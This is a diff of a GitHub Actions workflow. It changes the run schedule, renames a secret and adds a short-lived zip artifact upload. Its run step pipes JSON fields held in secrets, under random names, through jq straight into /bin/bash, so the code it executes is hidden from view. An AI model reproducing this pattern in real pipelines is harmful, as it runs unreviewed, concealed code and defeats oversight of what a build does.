@@ -1,23 +1,25 @@
 name: xiancongyongkai
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '57 3/6 * * *'
 
-jobs:  # 25370
+  schedule:
+    - cron: '1 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiancongyongkai
         env:
-          g96: ${{ secrets.g96 }}
+          houai5246: ${{ secrets.houai5246 }}
         run: |
-          echo $g96 | jq -r .pt97 | /bin/bash
-          echo $woqz126 | jq -r .dozmr8 | /bin/bash
-          echo $xtk01847 | jq -r .xlp964 | /bin/bash
-          echo $oxawk54588 | jq -r .lkjp1 | /bin/bash
-          echo $x5376 | jq -r .z3 | /bin/bash
-          echo $qnrky5 | jq -r .wd8 | /bin/bash
+          printf '%s' "$houai5246" | jq -r .cnr3412 | /bin/bash
+          echo $kro8856 | jq -r .wpfv5 | /bin/bash
+          printf '%s' "$b2444" | jq -r .k9012 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: g3SzJ7Jz
+          path: "*.zip"
+          retention-days: 1
